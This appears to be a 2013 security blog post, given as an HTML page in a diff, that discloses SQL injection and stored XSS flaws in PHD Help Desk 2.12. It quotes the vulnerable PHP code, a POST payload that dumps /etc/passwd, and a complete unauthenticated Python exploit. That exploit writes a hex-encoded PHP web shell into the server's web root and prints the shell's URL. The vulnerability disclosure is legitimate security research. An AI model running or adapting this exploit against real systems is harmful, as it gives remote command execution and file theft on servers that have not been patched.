@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<style type=text/css>body{font-family:monospace;}</style>
+	<title>PHD Help Desk 2.12 - SQLi/XSS</title>
+	
+	
+	<link rel="stylesheet" href="/css/style.css">
+	
+	
+</head>
+<body>
+	<header>
+
+	<div style="float: right;"></div><br>
+	<p>
+	<nav>
+			<a href="/"><b>post</b></a>.
+			
+			
+			<a href="/other/"><b>other</b></a>.
+			
+			<a href="/about/"><b>about</b></a>.
+			
+	</nav>
+	</p>
+	
+</header>
+
+	
+	<main>
+		<article>
+			<h1>PHD Help Desk 2.12 - SQLi/XSS</h1>
+			<b><time>2013-06-02</time></b>
+		       
+
+			<div>
+				<p><a href="http://www.p-hd.com.ar/">PHD Help Desk</a> is a help desk application used for managing help tickets in corporate/enterprise environments.  The latest version (2.12) is vulnerable to, well, quite a few instances of SQLi and XSS.  I&rsquo;ll try and go through a couple, but there are so many it&rsquo;s sort of embarrassing, and none of them are at all complex.  The software is clocking ~200 downloads/week on Sourceforge, and no telling how many off their website, so it&rsquo;s definitely still out there somewhere.  These issues have been disclosed to the vendor and a generous amount of time to fix them has since passed.</p>
+<p>The first place we&rsquo;ll start is <code>login.php</code>, which tellingly holds all of the login logic.  Here&rsquo;s the relevant bit:</p>
+<pre tabindex="0"><code>$operador=trim(strip_tags($_POST[operador]));
+$query=&#34;SELECT * FROM {$MyPHD}operador WHERE operador_id=&#39;$operador&#39;&#34;;
+$result=mysql_query($query) or die(mysql_error());
+$q_filas=mysql_num_rows($result);
+
+if($q_filas!=1)
+       {$mensaje=$Oper_not_autorized;
+        require($Include.&#39;login.inc&#39;);
+        exit();
+       }
+
+### Ahora verifico la contraseña
+$md5_contrasenia=md5($_POST[&#39;contrasenia&#39;]);
+
+$query=&#34;SELECT * FROM {$MyPHD}operador WHERE operador_id=&#39;$operador&#39; AND contrasenia=&#39;$md5_contrasenia&#39;&#34;;
+$result=mysql_query($query) or die (mysql_error());;
+$q_filas=mysql_num_rows($result);
+
+if ($q_filas!=1)
+             {$mensaje=$Invalid_passwd;
+             require($Include.&#39;login.inc&#39;);
+             exit();
+            }
+
+$data=mysql_fetch_array($result);
+if ($data[&#39;nivel&#39;]&lt;1)
+               {$mensaje=$Oper_not_autorized;
+                require($Include.&#39;login.inc&#39;);
+                exit();
+               }
+</code></pre><p>This doesn&rsquo;t even really try to sanitize anything.  <a href="http://php.net/manual/en/function.strip-tags.php">strip_tags</a> is used to remove HTML and PHP tags from a string, and <a href="http://php.net/manual/en/function.trim.php">trim</a> strips whitespace; what?  It pulls out the username, checks it in the database, then pulls the password, md5&rsquo;s it, and checks that in the database.  Plenty of opportunity for SQLi, but no way to get around the login screen with a simple <code>' OR '1=1</code>, due to the final query using the md5 of the password.  We could use a malicious username and comment that out, but then the first query would fail.  So instead, we&rsquo;ll just use the username to run malicious queries.</p>
+<p>Submitting the following POST data to login.php will dump <code>/etc/passwd</code></p>
+<pre tabindex="0"><code>operador=&#39; UNION SELECT LOAD_FILE(&#39;/etc/passwd&#39;),2,3,4,5,6,7,8,9,10,11,12,13,14 INTO OUTFILE &#39;/var/www/phd_2_12/psswd&amp;contrasenia=asdf&amp;submit=Enter&amp;captcha=
+</code></pre><figure class="center"><img src="http://4.bp.blogspot.com/-Ss9O_o4PeAI/UaBAiG65xPI/AAAAAAAAAfI/CvOmVOtxEVw/s640/phd_psswd.jpg"/>
+</figure>
+
+<p>With this, we can naturally obtain a web shell, as demonstrated by the exploit code I&rsquo;ve developed:</p>
+<pre tabindex="0"><code>root@jali:~# python phd_sqli.py -h
+usage: phd_sqli.py [-h] [-i IP] [-p ROOTP] [-w PATH]
+
+optional arguments:
+  -h, --help  show this help message and exit
+  -i IP       server address
+  -p ROOTP    path to login.php (/phd_2_12)
+  -w PATH     writable web path (/var/www/phd_2_12) for shell
+root@jali:~# python phd_sqli.py -i 192.168.1.83
+[!] Dropping web shell on 192.168.1.83...
+[!] Shell dropped.  http://192.168.1.83/phd_2_12/0m05k.php?rr=ls
+root@jali:~# 
+</code></pre><p>As a note, <code>strip_slashes</code> prevents us from submitting anything that includes HTML or PHP tags in it. So I&rsquo;ve gotten around that by simply hex encoding the string:</p>
+<pre tabindex="0"><code># &lt;? php system($_GET[&#34;rr&#34;]); ?&gt;
+data = urllib.urlencode({&#39;operador&#39;:(&#39;\&#39; UNION SELECT 0x3c3f7068702073797374656d28245f4745545b227272225d293b3f3e&#39;
+                                     &#39;,2,3,4,5,6,7,8,9,10,11,12,13,14 INTO OUTFILE&#39;
+                                     &#39; \&#39;{0}/{1}.php&#39;.format(options.path,shell)),
+                         &#39;contrasenia&#39;:&#39;pass&#39;,
+                         &#39;submit&#39;:&#39;Enter&#39;,
+                         &#39;captcha&#39;:&#39;&#39;})
+</code></pre><p>There&rsquo;s another SQLi vulnerability in <code>abro_adjunto.php</code>, which requires authentication to the application:</p>
+<pre tabindex="0"><code>if (isSet($_GET[&#39;file&#39;]))
+
+    {$query=&#34;SELECT *
+             FROM {$MyPHD}sigo_ticket
+             WHERE seq_sigo_ticket_id={$_GET[&#39;file&#39;]} &#34;;
+             
+     $result=mysql_query($query) or die (mysql_error());
+     
+     $row = mysql_fetch_array($result);
+
+     $tipo_adjunto = $row[&#39;tipo_adjunto&#39;];
+     $adjunto = $row[&#39;adjunto&#39;];
+     $nombre_adjunto = $row[&#39;nombre_adjunto&#39;];
+
+     if(strlen($nombre_adjunto)&gt;1)
+        {header(&#34;Content-type: $tipo_adjunto&#34;);
+         header(&#34;Content-Disposition: attachment; filename=\&#34;$nombre_adjunto\&#34;&#34;);
+         echo $adjunto;
+        }
+     else
+        {require(&#39;head.inc&#39;);
+         echo &#34;&lt;div class=&#39;error&#39;&gt;INVALID CALL &lt;/div&gt;&#34;;
+        }
+    }
+</code></pre><p>And the sanitization for this (and most files, really) is as follows:</p>
+<pre tabindex="0"><code>if (get_magic_quotes_gpc())
+    { foreach($_GET as $clave =&gt; $valor)
+      {$_GET[$clave]=stripslashes($_GET[$clave]);
+      }
+    }
+
+foreach($_GET as $clave =&gt; $valor)
+     {$_GET[$clave]=trim(htmlentities($_GET[$clave],ENT_QUOTES));
+     }
+</code></pre><p><a href="http://php.net/manual/en/function.htmlentities.php">htmlentities</a>, when specified with the ENT_QUOTES flag, will convert both single and double quotes into HTML entities, and will thus not be injectable.  However, the above query doesn&rsquo;t even use quotes, thus there is nothing to escape.</p>
+<p>There&rsquo;s stored XSS within all Attributes (Contact, Process, State, Type) that&rsquo;s loaded when viewing users:</p>
+<figure class="center"><img src="http://3.bp.blogspot.com/-AswfkyCHhRo/UaBswveQO1I/AAAAAAAAAfo/vBJREQ-qHjE/s640/phd_xss.jpg"/>
+</figure>
+
+<p>Here&rsquo;s the code for dropping a web shell; enjoy:</p>
+<pre tabindex="0"><code># Exploit Title: PHD Help Desk 2.12 SQLi
+# Date: 05/24/2013
+# Exploit Author: drone (@dronesec)
+# Vendor Homepage: http://www.p-hd.com.ar/
+# Software Link: http://downloads.sourceforge.net/project/phd/phd_released/phd%202.12/phd_2_12.zip
+# Version: 2.12
+# Tested on: Ubuntu 12.04 (apparmor disabled)
+
+&#34;&#34;&#34; This app is so full of SQLi &amp; XSS; if you&#39;re looking for
+    practice with real web apps, this is a good place to go.
+
+    You don&#39;t need auth for this.
+    @dronesec
+&#34;&#34;&#34;
+from argparse import ArgumentParser
+import string
+import random
+import urllib, urllib2
+import sys
+
+def run(options):
+    print &#39;[!] Dropping web shell on %s...&#39;%(options.ip)
+
+    shell = &#39;&#39;.join(random.choice(string.ascii_lowercase+string.digits) for x in range(5))
+
+    # &lt;? php system($_GET[&#34;rr&#34;]); ?&gt;
+    data = urllib.urlencode({&#39;operador&#39;:(&#39;\&#39; UNION SELECT 0x3c3f7068702073797374656d28245f4745545b227272225d293b3f3e&#39;
+                                    &#39;,null,null,null,null,null,null,null,null,null,null,null,null,null INTO OUTFILE&#39;
+                                        &#39; \&#39;{0}/{1}.php&#39;.format(options.path,shell)),
+                             &#39;contrasenia&#39;:&#39;pass&#39;,
+                             &#39;submit&#39;:&#39;Enter&#39;,
+                             &#39;captcha&#39;:&#39;&#39;})
+
+    urllib2.urlopen(&#39;http://{0}{1}/login.php&#39;.format(options.ip, options.rootp), data)
+    print &#39;[!] Shell dropped.  http://%s%s/%s.php?rr=ls&#39;%(options.ip,options.rootp,shell)
+
+def parse():
+    parser = ArgumentParser()
+    parser.add_argument(&#39;-i&#39;,help=&#39;server address&#39;,action=&#39;store&#39;,dest=&#39;ip&#39;)
+    parser.add_argument(&#39;-p&#39;,help=&#39;path to login.php (/phd_2_12)&#39;,action=&#39;store&#39;,
+                default=&#39;/phd_2_12&#39;, dest=&#39;rootp&#39;)
+    parser.add_argument(&#39;-w&#39;,help=&#39;writable web path (/var/www/phd_2_12) for shell&#39;,
+                default=&#39;/var/www/phd_2_12/&#39;, action=&#39;store&#39;, dest=&#39;path&#39;)
+
+    options = parser.parse_args()
+    if not options.ip:
+        parser.print_help()
+        sys.exit(1)
+
+    options.path = options.path if options.path[-1] != &#39;/&#39; else options.path[:-1]
+    options.rootp = options.rootp if options.path[-1] != &#39;/&#39; else options.path[:-1]
+    return options
+
+if __name__==&#34;__main__&#34;:
+    run(parse())
+</code></pre><p><a href="http://www.exploit-db.com/exploits/25915/">Exploit</a></p>
+
+			</div>
+		</article>
+	</main>
+<aside>
+	<div>
+		<div>
+			<h3>LATEST POSTS</h3>
+		</div>
+		<div>
+			<ul>
+				
+				<li><a href="/blog/the-fanciful-allure-and-utility-of-syscalls/">the fanciful allure and utility of syscalls</a></li>
+				
+				<li><a href="/blog/on-exploiting-cve-2021-1648-splwow64-lpe/">On Exploiting CVE-2021-1648 (splwow64 LPE)</a></li>
+				
+				<li><a href="/blog/digging-the-adobe-sandbox-ipc-internals/">Digging the Adobe Sandbox - IPC Internals</a></li>
+				
+				<li><a href="/blog/exploiting-leaked-process-and-thread-handles/">Exploiting Leaked Process and Thread Handles</a></li>
+				
+				<li><a href="/blog/code-execution-via-fiber-local-storage/">Code Execution via Fiber Local Storage</a></li>
+				
+			</ul>
+		</div>
+	</div>
+</aside>
+
+
+	<footer>
+	<p>&copy; 2024 <a href="https://dronesec.pw/"><b>Bryan Alexander</b></a>.
+	</p>
+</footer>
+
+</body>
+</html>
